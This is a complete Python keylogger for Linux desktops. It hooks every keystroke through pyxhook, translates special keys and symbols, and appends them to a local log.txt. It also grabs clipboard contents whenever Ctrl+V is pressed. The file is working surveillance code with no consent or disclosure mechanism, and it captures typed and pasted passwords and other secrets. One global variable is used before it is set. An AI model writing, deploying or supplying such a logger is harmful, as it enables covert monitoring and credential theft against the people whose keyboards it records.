import pyxhook
import gi
gi.require_version('Gtk', '3.0')
from gi.repository import Gtk, Gdk

log_file = 'log.txt'
cb = Gtk.Clipboard.get(Gdk.SELECTION_CLIPBOARD)

special_keys = ['Shift_L', 'Shift_R', 'Control_L', 'Control_R',
                'Alt_L', 'Alt_R', 'Super_L', 'Super_R',
                'Escape', 'Tab', 'Caps_Lock', 'Insert', 'Delete',
                'Print', 'Up', 'Down', 'Left', 'Right',
                'F1', 'F2', 'F3', 'F4',
                'F5', 'F6', 'F7', 'F8',
                'F9', 'F10', 'F11', 'F12']

symbols = {'grave': '`', 'asciitilde': '~', 'exclam': '!', 'at': '@', 'numbersign': '#',
           'dollar': '$', 'percent': '%', 'asciicircum': '^', 'ampersand': '&', 'asterisk': '*',
           'parenleft': '(', 'parenright': ')', 'minus': '-', 'equal': '=', 'underscore': '_',
           'plus': '+', 'bracketleft': '[', 'bracketright': ']', 'braceleft': '{', 'braceright': '}',
           'backslash': '\\', 'bar': '|', 'semicolon': ';', 'colon': ':', 'apostrophe': "'",
           'quotedbl': '"', 'comma': ',', 'period': '.', 'less': '<', 'greater': '>',
           'slash': '/', 'question': '?'}


def kb_event(event):

    global ctrl_set

    f = open(log_file, 'a')

    try:
        if event.Key == 'Return':
            f.write("\n")

        elif event.Key == 'space':
            f.write(" ")

        elif event.Key == 'BackSpace':
            f.write("<-")

        elif event.Key == 'v' or event.Key == 'V':
            content = cb.wait_for_text()
            if ctrl_set == 1:
                f.write("Paste: " + content)

            else:
                f.write(event.Key)

        elif event.Key in special_keys:
            f.write("<" + event.Key + ">")
            if event.Key.startswith('Control'):
                raise ValueError

        elif event.Key in symbols:
            f.write(symbols.get(event.Key))

        else:
            f.write(event.Key)

        ctrl_set = 0

    except ValueError:
        ctrl_set = 1

def main():
    hookman = pyxhook.HookManager()
    hookman.KeyDown = kb_event
    hookman.HookKeyboard()
    hookman.start()

if __name__ == "__main__": main()
